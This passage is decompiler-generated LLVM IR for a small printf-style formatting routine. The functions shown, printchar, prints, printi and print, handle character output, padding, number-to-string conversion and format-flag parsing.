  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_80483c7 = icmp eq i32* %arg1, null
  br i1 %v4_80483c7, label %dec_label_pc_80483e6, label %dec_label_pc_80483cd

dec_label_pc_80483cd:                             ; preds = %entry
  %tmp3 = ptrtoint i32* %arg1 to i32
  %v2_80483d0 = load i32, i32* %arg1, align 4
  %v3_80483d5 = inttoptr i32 %v2_80483d0 to i8*
  store i8 %tmp8, i8* %v3_80483d5, align 1
  %v2_80483da = load i32, i32* %arg1, align 4
  %v1_80483dc = add i32 %v2_80483da, 1
  store i32 %v1_80483dc, i32* %arg1, align 4
  br label %dec_label_pc_80483f9

dec_label_pc_80483e6:                             ; preds = %entry
  %v3_80483f1 = bitcast i8* %stack_var_8 to i32*
  %v4_80483f1 = call i32 @__libc_write(i32 1, i32* %v3_80483f1, i32 1)
  br label %dec_label_pc_80483f9

dec_label_pc_80483f9:                             ; preds = %dec_label_pc_80483cd, %dec_label_pc_80483e6
  %v0_80483fa = phi i32 [ %tmp3, %dec_label_pc_80483cd ], [ %v4_80483f1, %dec_label_pc_80483e6 ]
  ret i32 %v0_80483fa

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_80483f9, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp25 = icmp slt i32 %arg3, 1
  br i1 %tmp25, label %dec_label_pc_804845b, label %dec_label_pc_8048415

dec_label_pc_8048415:                             ; preds = %entry
  %v4_804841c = ptrtoint i8* %arg2 to i32
  %v2_804842d56 = load i8, i8* %arg2, align 1
  %v3_804842d57 = zext i8 %v2_804842d56 to i32
  %v5_804842d58 = and i32 %v4_804841c, -256
  %v6_804842d59 = or i32 %v3_804842d57, %v5_804842d58
  %v4_804842f60 = icmp eq i8 %v2_804842d56, 0
  %v1_804843161 = icmp eq i1 %v4_804842f60, false
  br i1 %v1_804843161, label %dec_label_pc_8048424, label %dec_label_pc_8048433

dec_label_pc_8048424:                             ; preds = %dec_label_pc_8048415, %dec_label_pc_8048424
  %v6_804842d64 = phi i32 [ %v6_804842d, %dec_label_pc_8048424 ], [ %v6_804842d59, %dec_label_pc_8048415 ]
  %v4_804842a63 = phi i32 [ %v5_8048427, %dec_label_pc_8048424 ], [ %v4_804841c, %dec_label_pc_8048415 ]
  %stack_var_-12.062 = phi i32 [ %v4_8048424, %dec_label_pc_8048424 ], [ 0, %dec_label_pc_8048415 ]
  %v4_8048424 = add i32 %stack_var_-12.062, 1
  %v5_8048427 = add i32 %v4_804842a63, 1
  %v22_8048427 = inttoptr i32 %v5_8048427 to i8*
  %v2_804842d = load i8, i8* %v22_8048427, align 1
  %v3_804842d = zext i8 %v2_804842d to i32
  %v5_804842d = and i32 %v6_804842d64, -256
  %v6_804842d = or i32 %v3_804842d, %v5_804842d
  %v4_804842f = icmp eq i8 %v2_804842d, 0
  %v1_8048431 = icmp eq i1 %v4_804842f, false
  br i1 %v1_8048431, label %dec_label_pc_8048424, label %dec_label_pc_8048433

dec_label_pc_8048433:                             ; preds = %dec_label_pc_8048424, %dec_label_pc_8048415
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_8048415 ], [ %v4_8048424, %dec_label_pc_8048424 ]
  %v5_8048439 = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_8048439, label %dec_label_pc_8048444, label %dec_label_pc_804844a

dec_label_pc_8048444:                             ; preds = %dec_label_pc_8048433
  %v5_8048447 = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_804844a

dec_label_pc_804844a:                             ; preds = %dec_label_pc_8048433, %dec_label_pc_8048444
  %storemerge = phi i32 [ %v5_8048447, %dec_label_pc_8048444 ], [ 0, %dec_label_pc_8048433 ]
  %v1_804844d = and i32 %arg4, 2
  %tmp26 = mul nuw nsw i32 %v1_804844d, 8
  %tmp27 = or i32 %tmp26, 32
  br label %dec_label_pc_804845b

dec_label_pc_804845b:                             ; preds = %dec_label_pc_804844a, %entry
  %stack_var_12.0 = phi i32 [ %arg3, %entry ], [ %storemerge, %dec_label_pc_804844a ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ %tmp27, %dec_label_pc_804844a ]
  %v1_804845e = urem i32 %arg4, 2
  %v2_804845e = icmp eq i32 %v1_804845e, 0
  %v1_8048463 = icmp eq i1 %v2_804845e, false
  %.pre11 = inttoptr i32 %arg1 to i32*
  br i1 %v1_8048463, label %dec_label_pc_80484a5.preheader, label %dec_label_pc_804847e.preheader

dec_label_pc_804847e.preheader:                   ; preds = %dec_label_pc_804845b
  %tmp2849 = icmp slt i32 %stack_var_12.0, 1
  %tmp2950 = icmp eq i1 %tmp2849, false
  br i1 %tmp2950, label %dec_label_pc_8048467.lr.ph, label %dec_label_pc_80484a5.preheader

dec_label_pc_8048467.lr.ph:                       ; preds = %dec_label_pc_804847e.preheader
  br label %dec_label_pc_8048467

dec_label_pc_8048467:                             ; preds = %dec_label_pc_8048467.lr.ph, %dec_label_pc_8048467
  %stack_var_-20.052 = phi i32 [ 0, %dec_label_pc_8048467.lr.ph ], [ %v4_8048478, %dec_label_pc_8048467 ]
  %stack_var_12.151 = phi i32 [ %stack_var_12.0, %dec_label_pc_8048467.lr.ph ], [ %v4_804847b, %dec_label_pc_8048467 ]
  %v3_8048470 = call i32 @printchar(i32* %.pre11, i32 %stack_var_-16.0)
  %v4_8048478 = add i32 %stack_var_-20.052, 1
  %v4_804847b = add i32 %stack_var_12.151, -1
  %tmp28 = icmp slt i32 %v4_804847b, 1
  %tmp29 = icmp eq i1 %tmp28, false
  br i1 %tmp29, label %dec_label_pc_8048467, label %dec_label_pc_80484a5.preheader

dec_label_pc_80484a5.preheader:                   ; preds = %dec_label_pc_804847e.preheader, %dec_label_pc_8048467, %dec_label_pc_804845b
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_804845b ], [ %stack_var_12.0, %dec_label_pc_804847e.preheader ], [ %v4_804847b, %dec_label_pc_8048467 ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_804845b ], [ 0, %dec_label_pc_804847e.preheader ], [ %v4_8048478, %dec_label_pc_8048467 ]
  %v2_80484a838 = load i8, i8* %arg2, align 1
  %v4_80484aa42 = icmp eq i8 %v2_80484a838, 0
  %v1_80484ac43 = icmp eq i1 %v4_80484aa42, false
  br i1 %v1_80484ac43, label %dec_label_pc_8048486.lr.ph, label %dec_label_pc_80484c7.preheader

dec_label_pc_8048486.lr.ph:                       ; preds = %dec_label_pc_80484a5.preheader
  %v4_80484a537 = ptrtoint i8* %arg2 to i32
  br label %dec_label_pc_8048486

dec_label_pc_8048486:                             ; preds = %dec_label_pc_8048486.lr.ph, %dec_label_pc_8048486
  %v4_80484a546 = phi i32 [ %v4_80484a537, %dec_label_pc_8048486.lr.ph ], [ %v5_80484a2, %dec_label_pc_8048486 ]
  %stack_var_-20.145 = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_8048486.lr.ph ], [ %v4_804849f, %dec_label_pc_8048486 ]
  %stack_var_8.044 = phi i8* [ %arg2, %dec_label_pc_8048486.lr.ph ], [ %v22_80484a2, %dec_label_pc_8048486 ]
  %v2_8048489 = load i8, i8* %stack_var_8.044, align 1
  %v3_8048489 = zext i8 %v2_8048489 to i32
  %v3_8048497 = call i32 @printchar(i32* %.pre11, i32 %v3_8048489)
  %v4_804849f = add i32 %stack_var_-20.145, 1
  %v5_80484a2 = add i32 %v4_80484a546, 1
  %v22_80484a2 = inttoptr i32 %v5_80484a2 to i8*
  %v2_80484a8 = load i8, i8* %v22_80484a2, align 1
  %v4_80484aa = icmp eq i8 %v2_80484a8, 0
  %v1_80484ac = icmp eq i1 %v4_80484aa, false
  br i1 %v1_80484ac, label %dec_label_pc_8048486, label %dec_label_pc_80484c7.preheader

dec_label_pc_80484c7.preheader:                   ; preds = %dec_label_pc_8048486, %dec_label_pc_80484a5.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_80484a5.preheader ], [ %v4_804849f, %dec_label_pc_8048486 ]
  %tmp3033 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp3134 = icmp eq i1 %tmp3033, false
  br i1 %tmp3134, label %dec_label_pc_80484b0.lr.ph, label %dec_label_pc_80484cd

dec_label_pc_80484b0.lr.ph:                       ; preds = %dec_label_pc_80484c7.preheader
  br label %dec_label_pc_80484b0

dec_label_pc_80484b0:                             ; preds = %dec_label_pc_80484b0.lr.ph, %dec_label_pc_80484b0
  %stack_var_-20.236 = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_80484b0.lr.ph ], [ %v4_80484c1, %dec_label_pc_80484b0 ]
  %stack_var_12.335 = phi i32 [ %stack_var_12.2.ph, %dec_label_pc_80484b0.lr.ph ], [ %v4_80484c4, %dec_label_pc_80484b0 ]
  %v3_80484b9 = call i32 @printchar(i32* %.pre11, i32 %stack_var_-16.0)
  %v4_80484c1 = add i32 %stack_var_-20.236, 1
  %v4_80484c4 = add i32 %stack_var_12.335, -1
  %tmp30 = icmp slt i32 %v4_80484c4, 1
  %tmp31 = icmp eq i1 %tmp30, false
  br i1 %tmp31, label %dec_label_pc_80484b0, label %dec_label_pc_80484cd

dec_label_pc_80484cd:                             ; preds = %dec_label_pc_80484b0, %dec_label_pc_80484c7.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_80484c7.preheader ], [ %v4_80484c1, %dec_label_pc_80484b0 ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v5_80484a2, { 1, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 0 }
  uselistorder i32 %v5_8048427, { 1, 0 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 1, 3, 2, 0, 4 }
  uselistorder label %dec_label_pc_80484b0, { 1, 0 }
  uselistorder label %dec_label_pc_8048486, { 1, 0 }
  uselistorder label %dec_label_pc_80484a5.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048467, { 1, 0 }
  uselistorder label %dec_label_pc_804844a, { 1, 0 }
  uselistorder label %dec_label_pc_8048424, { 1, 0 }
}

define i32 @printi(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i8*, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = call i32 @__decompiler_undefined_function_0()
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v5_80484e9 = sext i32 %tmp35 to i64
  %v4_80484ec = icmp eq i32 %tmp35, 0
  %v5_80484ec = icmp slt i32 %tmp35, 0
  %v1_80484f0 = icmp eq i1 %v4_80484ec, false
  br i1 %v1_80484f0, label %dec_label_pc_8048517, label %dec_label_pc_80484f2

dec_label_pc_80484f2:                             ; preds = %entry
  store i32 48, i32* %stack_var_-16, align 4
  %tmp47 = bitcast i32* %stack_var_-16 to i8*
  %v6_8048507 = call i32 @prints(i32 %arg1, i8* %tmp47, i32 %tmp31, i32 %tmp32)
  br label %dec_label_pc_80485f2

dec_label_pc_8048517:                             ; preds = %entry
  %v4_8048517 = icmp eq i32 %tmp28, 0
  br i1 %v4_8048517, label %dec_label_pc_8048538, label %dec_label_pc_804851d

dec_label_pc_804851d:                             ; preds = %dec_label_pc_8048517
  %v12_804851d = icmp eq i32 %tmp27, 10
  %v1_8048521 = icmp eq i1 %v12_804851d, false
  br i1 %v1_8048521, label %dec_label_pc_8048538, label %dec_label_pc_8048523

dec_label_pc_8048523:                             ; preds = %dec_label_pc_804851d
  %v1_8048527 = icmp eq i1 %v5_80484ec, false
  br i1 %v1_8048527, label %dec_label_pc_8048538, label %dec_label_pc_8048529

dec_label_pc_8048529:                             ; preds = %dec_label_pc_8048523
  %v1_8048533 = sub i32 0, %tmp35
  %v5_8048535 = sext i32 %v1_8048533 to i64
  br label %dec_label_pc_8048538

dec_label_pc_8048538:                             ; preds = %dec_label_pc_8048523, %dec_label_pc_804851d, %dec_label_pc_8048517, %dec_label_pc_8048529
  %stack_var_-24.0 = phi i64 [ %v5_80484e9, %dec_label_pc_8048517 ], [ %v5_80484e9, %dec_label_pc_804851d ], [ %v5_80484e9, %dec_label_pc_8048523 ], [ %v5_8048535, %dec_label_pc_8048529 ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_8048517 ], [ 0, %dec_label_pc_804851d ], [ 0, %dec_label_pc_8048523 ], [ 1, %dec_label_pc_8048529 ]
  %v15_804853b = ptrtoint i32* %stack_var_-5 to i32
  %tmp48 = bitcast i32* %stack_var_-5 to i8*
  store i8* %tmp48, i8** %stack_var_-40, align 4
  store i8 0, i8* %tmp48, align 4
  %v4_80485997 = trunc i64 %stack_var_-24.0 to i32
  %v5_80485998 = icmp eq i32 %v4_80485997, 0
  %v1_804859d15 = icmp eq i1 %v5_80485998, false
  br i1 %v1_804859d15, label %dec_label_pc_8048549.lr.ph, label %dec_label_pc_804859f

dec_label_pc_8048549.lr.ph:                       ; preds = %dec_label_pc_8048538
  %v5_804854c = sext i32 %tmp27 to i64
  br label %dec_label_pc_8048549

dec_label_pc_8048549:                             ; preds = %dec_label_pc_8048549.lr.ph, %dec_label_pc_8048571
  %v3_804857118 = phi i8* [ %tmp48, %dec_label_pc_8048549.lr.ph ], [ %v22_8048571, %dec_label_pc_8048571 ]
  %stack_var_-24.116 = phi i64 [ %stack_var_-24.0, %dec_label_pc_8048549.lr.ph ], [ %v5_8048596, %dec_label_pc_8048571 ]
  %v6_8048557 = and i64 %stack_var_-24.116, 4294967295
  %v12_8048557 = udiv i64 %v6_8048557, %v5_804854c
  %v13_8048557 = trunc i64 %v12_8048557 to i32
  %v14_8048557 = urem i64 %v6_8048557, %v5_804854c
  %v5_804855c = trunc i64 %v14_8048557 to i8
  %v7_8048563 = icmp sgt i8 %v5_804855c, 9
  br i1 %v7_8048563, label %dec_label_pc_8048565, label %dec_label_pc_8048571

dec_label_pc_8048565:                             ; preds = %dec_label_pc_8048549
  %tmp52 = trunc i64 %v14_8048557 to i32
  %v5_8048568 = add i32 %tmp52, %tmp
  %v1_804856b = add i32 %v5_8048568, 198
  %v11_804856b = trunc i32 %v1_804856b to i8
  br label %dec_label_pc_8048571

dec_label_pc_8048571:                             ; preds = %dec_label_pc_8048549, %dec_label_pc_8048565
  %stack_var_-36.0 = phi i8 [ %v11_804856b, %dec_label_pc_8048565 ], [ %v5_804855c, %dec_label_pc_8048549 ]
  %v4_8048571 = ptrtoint i8* %v3_804857118 to i32
  %v5_8048571 = add i32 %v4_8048571, -1
  %v22_8048571 = inttoptr i32 %v5_8048571 to i8*
  %v1_8048577 = add i8 %stack_var_-36.0, 48
  store i8 %v1_8048577, i8* %v22_8048571, align 1
  %v5_8048596 = sext i32 %v13_8048557 to i64
  %v5_8048599 = icmp eq i32 %v13_8048557, 0
  %v1_804859d = icmp eq i1 %v5_8048599, false
  br i1 %v1_804859d, label %dec_label_pc_8048549, label %dec_label_pc_8048599.dec_label_pc_804859f_crit_edge

dec_label_pc_8048599.dec_label_pc_804859f_crit_edge: ; preds = %dec_label_pc_8048571
  store i8* %v22_8048571, i8** %stack_var_-40, align 4
  br label %dec_label_pc_804859f

dec_label_pc_804859f:                             ; preds = %dec_label_pc_8048599.dec_label_pc_804859f_crit_edge, %dec_label_pc_8048538
  %v3_80485dc622 = phi i32 [ %v5_8048571, %dec_label_pc_8048599.dec_label_pc_804859f_crit_edge ], [ %v15_804853b, %dec_label_pc_8048538 ]
  %v3_80485cd = phi i8* [ %v22_8048571, %dec_label_pc_8048599.dec_label_pc_804859f_crit_edge ], [ %tmp48, %dec_label_pc_8048538 ]
  %v4_804859f = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_804859f, label %dec_label_pc_80485d6, label %dec_label_pc_80485a5

dec_label_pc_80485a5:                             ; preds = %dec_label_pc_804859f
  %v4_80485a5 = icmp eq i32 %tmp31, 0
  br i1 %v4_80485a5, label %dec_label_pc_80485cd, label %dec_label_pc_80485ab

dec_label_pc_80485ab:                             ; preds = %dec_label_pc_80485a5
  %v1_80485ae = and i32 %tmp32, 2
  %v2_80485ae = icmp eq i32 %v1_80485ae, 0
  br i1 %v2_80485ae, label %dec_label_pc_80485cd, label %dec_label_pc_80485b5

dec_label_pc_80485b5:                             ; preds = %dec_label_pc_80485ab
  %v3_80485bd = inttoptr i32 %arg1 to i32*
  %v4_80485bd = call i32 @printchar(i32* %v3_80485bd, i32 45)
  %v4_80485c8 = add i32 %tmp31, -1
  br label %dec_label_pc_80485d6

dec_label_pc_80485cd:                             ; preds = %dec_label_pc_80485ab, %dec_label_pc_80485a5
  %v4_80485cd = ptrtoint i8* %v3_80485cd to i32
  %v5_80485cd = add i32 %v4_80485cd, -1
  %v22_80485cd = inttoptr i32 %v5_80485cd to i8*
  store i8* %v22_80485cd, i8** %stack_var_-40, align 4
  store i8 45, i8* %v22_80485cd, align 1
  %.phi.trans.insert = bitcast i8** %stack_var_-40 to i32*
  %v3_80485dc6.pre = load i32, i32* %.phi.trans.insert, align 4
  br label %dec_label_pc_80485d6

dec_label_pc_80485d6:                             ; preds = %dec_label_pc_804859f, %dec_label_pc_80485b5, %dec_label_pc_80485cd
  %v3_80485dc6 = phi i32 [ %v3_80485dc622, %dec_label_pc_804859f ], [ %v3_80485dc6.pre, %dec_label_pc_80485cd ], [ %v3_80485dc622, %dec_label_pc_80485b5 ]
  %stack_var_20.0 = phi i32 [ %tmp31, %dec_label_pc_804859f ], [ %tmp31, %dec_label_pc_80485cd ], [ %v4_80485c8, %dec_label_pc_80485b5 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_804859f ], [ 0, %dec_label_pc_80485cd ], [ 1, %dec_label_pc_80485b5 ]
  %v1_80485e2.cast = inttoptr i32 %v3_80485dc6 to i8*
  %v6_80485e2 = call i32 @prints(i32 %arg1, i8* %v1_80485e2.cast, i32 %stack_var_20.0, i32 %tmp32)
  %v2_80485ed = add i32 %v6_80485e2, %stack_var_-28.0
  br label %dec_label_pc_80485f2

dec_label_pc_80485f2:                             ; preds = %dec_label_pc_80484f2, %dec_label_pc_80485d6
  %storemerge = phi i32 [ %v2_80485ed, %dec_label_pc_80485d6 ], [ %v6_8048507, %dec_label_pc_80484f2 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %v22_8048571, { 0, 1, 3, 2 }
  uselistorder i8 %v5_804855c, { 1, 0 }
  uselistorder i64 %v6_8048557, { 1, 0 }
  uselistorder i32 %tmp35, { 3, 1, 2, 0 }
  uselistorder i32 %tmp32, { 0, 2, 1 }
  uselistorder i32 %tmp31, { 2, 4, 1, 3, 0 }
  uselistorder i32 %tmp27, { 1, 0 }
  uselistorder i8** %stack_var_-40, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80485f2, { 1, 0 }
  uselistorder label %dec_label_pc_80485d6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048571, { 1, 0 }
  uselistorder label %dec_label_pc_8048549, { 1, 0 }
  uselistorder label %dec_label_pc_8048538, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v15_80485fa = ptrtoint i32* %stack_var_-44 to i32
  %v2_80487ec = ptrtoint i32* %stack_var_-6 to i32
  %stack_var_8.444 = inttoptr i32 %arg2 to i8*
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804882245 = load i8, i8* %stack_var_8.444, align 1
  %v3_804882246 = zext i8 %v2_804882245 to i32
  %v5_804882247 = and i32 %arg2, -256
  %v6_804882248 = or i32 %v3_804882246, %v5_804882247
  store i32 %v6_804882248, i32* %eax.global-to-local, align 4
  %v4_804882449 = icmp eq i8 %v2_804882245, 0
  %v1_804882650 = icmp eq i1 %v4_804882449, false
  br i1 %v1_804882650, label %dec_label_pc_8048609, label %dec_label_pc_804882c

dec_label_pc_8048609:                             ; preds = %entry, %dec_label_pc_804881c
  %v0_804880a = phi i32 [ %v4_80486ce66, %dec_label_pc_804881c ], [ %v15_80485fa, %entry ]
  %v5_804882256 = phi i32 [ %v5_8048822, %dec_label_pc_804881c ], [ %v5_804882247, %entry ]
  %stack_var_8.455 = phi i8* [ %stack_var_8.4, %dec_label_pc_804881c ], [ %stack_var_8.444, %entry ]
  %stack_var_-28.154 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804881c ], [ 0, %entry ]
  %stack_var_8.4.in53 = phi i32 [ %v5_804881c, %dec_label_pc_804881c ], [ %arg2, %entry ]
  %stack_var_12.152 = phi i32 [ %stack_var_12.0, %dec_label_pc_804881c ], [ %arg3, %entry ]
  %stack_var_-24.151 = phi i32 [ %stack_var_-24.0, %dec_label_pc_804881c ], [ %tmp5, %entry ]
  store i32 %stack_var_8.4.in53, i32* %eax.global-to-local, align 4
  %v2_804860c = load i8, i8* %stack_var_8.455, align 1
  %v3_804860c = zext i8 %v2_804860c to i32
  %v6_804860c = or i32 %v3_804860c, %v5_804882256
  store i32 %v6_804860c, i32* %eax.global-to-local, align 4
  %v10_804860e = icmp eq i8 %v2_804860c, 37
  %v1_8048610 = icmp eq i1 %v10_804860e, false
  br i1 %v1_8048610, label %dec_label_pc_8048800, label %dec_label_pc_8048616

dec_label_pc_8048616:                             ; preds = %dec_label_pc_8048609
  %v5_8048616 = add i32 %stack_var_8.4.in53, 1
  %v22_8048616 = inttoptr i32 %v5_8048616 to i8*
  store i32 %v5_8048616, i32* %eax.global-to-local, align 4
  %v2_8048629 = load i8, i8* %v22_8048616, align 1
  %v3_8048629 = zext i8 %v2_8048629 to i32
  %v5_8048629 = and i32 %v5_8048616, -256
  %v6_8048629 = or i32 %v3_8048629, %v5_8048629
  store i32 %v6_8048629, i32* %eax.global-to-local, align 4
  %v4_804862b = icmp eq i8 %v2_8048629, 0
  br i1 %v4_804862b, label %dec_label_pc_804882c, label %dec_label_pc_8048633

dec_label_pc_8048633:                             ; preds = %dec_label_pc_8048616
  store i32 %v5_8048616, i32* %eax.global-to-local, align 4
  %v2_8048636 = load i8, i8* %v22_8048616, align 1
  %v3_8048636 = zext i8 %v2_8048636 to i32
  %v6_8048636 = or i32 %v3_8048636, %v5_8048629
  store i32 %v6_8048636, i32* %eax.global-to-local, align 4
  %v10_8048638 = icmp eq i8 %v2_8048636, 37
  br i1 %v10_8048638, label %dec_label_pc_8048800, label %dec_label_pc_8048640

dec_label_pc_8048640:                             ; preds = %dec_label_pc_8048633
  store i32 %v5_8048616, i32* %eax.global-to-local, align 4
  %v2_8048643 = load i8, i8* %v22_8048616, align 1
  %v3_8048643 = zext i8 %v2_8048643 to i32
  %v6_8048643 = or i32 %v3_8048643, %v5_8048629
  store i32 %v6_8048643, i32* %eax.global-to-local, align 4
  %v10_8048645 = icmp eq i8 %v2_8048643, 45
  %v1_8048647 = icmp eq i1 %v10_8048645, false
  br i1 %v1_8048647, label %dec_label_pc_804865c.preheader, label %dec_label_pc_8048649

dec_label_pc_8048649:                             ; preds = %dec_label_pc_8048640
  %v5_8048649 = add i32 %stack_var_8.4.in53, 2
  %v22_8048649 = inttoptr i32 %v5_8048649 to i8*
  br label %dec_label_pc_804865c.preheader

dec_label_pc_804865c.preheader:                   ; preds = %dec_label_pc_8048649, %dec_label_pc_8048640
  %stack_var_8.0.ph = phi i8* [ %v22_8048616, %dec_label_pc_8048640 ], [ %v22_8048649, %dec_label_pc_8048649 ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_8048640 ], [ 1, %dec_label_pc_8048649 ]
  %v4_804865c15 = ptrtoint i8* %stack_var_8.0.ph to i32
  store i32 %v4_804865c15, i32* %eax.global-to-local, align 4
  %v2_804865f16 = load i8, i8* %stack_var_8.0.ph, align 1
  %v3_804865f17 = zext i8 %v2_804865f16 to i32
  %v5_804865f18 = and i32 %v4_804865c15, -256
  %v6_804865f19 = or i32 %v3_804865f17, %v5_804865f18
  store i32 %v6_804865f19, i32* %eax.global-to-local, align 4
  %v7_804866121 = icmp eq i8 %v2_804865f16, 48
  br i1 %v7_804866121, label %dec_label_pc_8048655, label %dec_label_pc_804868b.preheader

dec_label_pc_8048655:                             ; preds = %dec_label_pc_804865c.preheader, %dec_label_pc_8048655
  %v4_804865c23 = phi i32 [ %v5_8048655, %dec_label_pc_8048655 ], [ %v4_804865c15, %dec_label_pc_804865c.preheader ]
  %stack_var_-32.022 = phi i32 [ %v4_8048658, %dec_label_pc_8048655 ], [ %stack_var_-32.0.ph, %dec_label_pc_804865c.preheader ]
  %v5_8048655 = add i32 %v4_804865c23, 1
  %v22_8048655 = inttoptr i32 %v5_8048655 to i8*
  %v4_8048658 = or i32 %stack_var_-32.022, 2
  store i32 %v5_8048655, i32* %eax.global-to-local, align 4
  %v2_804865f = load i8, i8* %v22_8048655, align 1
  %v3_804865f = zext i8 %v2_804865f to i32
  %v5_804865f = and i32 %v5_8048655, -256
  %v6_804865f = or i32 %v3_804865f, %v5_804865f
  store i32 %v6_804865f, i32* %eax.global-to-local, align 4
  %v7_8048661 = icmp eq i8 %v2_804865f, 48
  br i1 %v7_8048661, label %dec_label_pc_8048655, label %dec_label_pc_804868b.preheader

dec_label_pc_804868b.preheader:                   ; preds = %dec_label_pc_8048655, %dec_label_pc_804865c.preheader
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_804865c.preheader ], [ %v4_8048658, %dec_label_pc_8048655 ]
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_804865c.preheader ], [ %v22_8048655, %dec_label_pc_8048655 ]
  %v4_804868b25 = ptrtoint i8* %stack_var_8.0.lcssa to i32
  store i32 %v4_804868b25, i32* %eax.global-to-local, align 4
  %v2_804868e26 = load i8, i8* %stack_var_8.0.lcssa, align 1
  %v3_804868e27 = zext i8 %v2_804868e26 to i32
  %v5_804868e28 = and i32 %v4_804868b25, -256
  %v6_804868e29 = or i32 %v3_804868e27, %v5_804868e28
  store i32 %v6_804868e29, i32* %eax.global-to-local, align 4
  %tmp67 = icmp ult i8 %v2_804868e26, 48
  br i1 %tmp67, label %dec_label_pc_804869d, label %dec_label_pc_8048694

dec_label_pc_8048667:                             ; preds = %dec_label_pc_8048694
  %v2_8048670 = mul i32 %stack_var_-36.032, 10
  store i32 %v4_804868b34, i32* %eax.global-to-local, align 4
  %v2_8048678 = load i8, i8* %stack_var_8.133, align 1
  %v3_8048678 = zext i8 %v2_8048678 to i32
  %v5_804867f = add i32 %v3_8048678, %v2_8048670
  %v1_8048682 = add i32 %v5_804867f, -48
  %v5_8048688 = add i32 %v4_804868b34, 1
  %v22_8048688 = inttoptr i32 %v5_8048688 to i8*
  store i32 %v5_8048688, i32* %eax.global-to-local, align 4
  %v2_804868e = load i8, i8* %v22_8048688, align 1
  %v3_804868e = zext i8 %v2_804868e to i32
  %v5_804868e = and i32 %v5_8048688, -256
  %v6_804868e = or i32 %v3_804868e, %v5_804868e
  store i32 %v6_804868e, i32* %eax.global-to-local, align 4
  %tmp68 = icmp ult i8 %v2_804868e, 48
  br i1 %tmp68, label %dec_label_pc_804869d, label %dec_label_pc_8048694

dec_label_pc_8048694:                             ; preds = %dec_label_pc_804868b.preheader, %dec_label_pc_8048667
  %v5_804868e35 = phi i32 [ %v5_804868e, %dec_label_pc_8048667 ], [ %v5_804868e28, %dec_label_pc_804868b.preheader ]
  %v4_804868b34 = phi i32 [ %v5_8048688, %dec_label_pc_8048667 ], [ %v4_804868b25, %dec_label_pc_804868b.preheader ]
  %stack_var_8.133 = phi i8* [ %v22_8048688, %dec_label_pc_8048667 ], [ %stack_var_8.0.lcssa, %dec_label_pc_804868b.preheader ]
  %stack_var_-36.032 = phi i32 [ %v1_8048682, %dec_label_pc_8048667 ], [ 0, %dec_label_pc_804868b.preheader ]
  store i32 %v4_804868b34, i32* %eax.global-to-local, align 4
  %v2_8048697 = load i8, i8* %stack_var_8.133, align 1
  %v3_8048697 = zext i8 %v2_8048697 to i32
  %v6_8048697 = or i32 %v3_8048697, %v5_804868e35
  store i32 %v6_8048697, i32* %eax.global-to-local, align 4
  %tmp69 = icmp ult i8 %v2_8048697, 58
  br i1 %tmp69, label %dec_label_pc_8048667, label %dec_label_pc_804869d

dec_label_pc_804869d:                             ; preds = %dec_label_pc_8048667, %dec_label_pc_8048694, %dec_label_pc_804868b.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_804868b.preheader ], [ %stack_var_-36.032, %dec_label_pc_8048694 ], [ %v1_8048682, %dec_label_pc_8048667 ]
  %stack_var_8.1.lcssa = phi i8* [ %stack_var_8.0.lcssa, %dec_label_pc_804868b.preheader ], [ %stack_var_8.133, %dec_label_pc_8048694 ], [ %v22_8048688, %dec_label_pc_8048667 ]
  %v4_804868b.lcssa = phi i32 [ %v4_804868b25, %dec_label_pc_804868b.preheader ], [ %v4_804868b34, %dec_label_pc_8048694 ], [ %v5_8048688, %dec_label_pc_8048667 ]
